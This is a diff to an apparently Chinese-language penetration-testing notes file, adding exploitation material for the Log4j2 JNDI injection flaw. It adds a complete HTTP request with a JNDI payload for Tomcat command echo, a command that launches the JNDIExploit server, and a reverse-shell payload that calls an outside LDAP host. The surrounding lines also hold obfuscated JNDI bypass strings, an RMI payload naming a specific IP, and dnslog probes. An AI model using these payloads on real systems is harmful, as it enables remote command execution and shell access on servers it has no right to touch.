@@ -429,8 +429,32 @@ payload="${jndi:rmi://1.117.51.253:1099/pnlvzg}"
 ![image](./img/log4j2-2.png)
 
 
-其它dnslog payload：
+tomcat回显方法：
+- 参考文章：https://zone.huoxian.cn/d/729-log4j2
 
+```
+POST /api/ HTTP/1.1
+Host: xxxxx:6631
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+cmd:whoami
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+
+data=${jndi:ldap://xxxx:1389/Basic/TomcatEcho}
+```
+
+`java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 0.0.0.0 -p 9190`
+
+反弹shell：
+`data=${jndi:ldap://xxxxx:1389/Basic/ReverseShell/xxxx/5551}`
+
+其它dnslog payload：
 ```
 c=${jndi:ldap://xxx.dnslog.cn}
 ```
@@ -449,7 +473,10 @@ ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/p
 探测工具bp插件：
 - https://github.com/whwlsfb/Log4j2Scan
 - https://github.com/f0ng/log4j2burpscanner
+- [log4j2漏洞快速轻量级检测](https://github.com/test502git/log4j-fuzz-head-poc)
+
 图形化测试工具：https://github.com/nice0e3/log4j_POC
+
 ## Grafana
 
 Grafana是一个开源的度量分析与可视化套件。
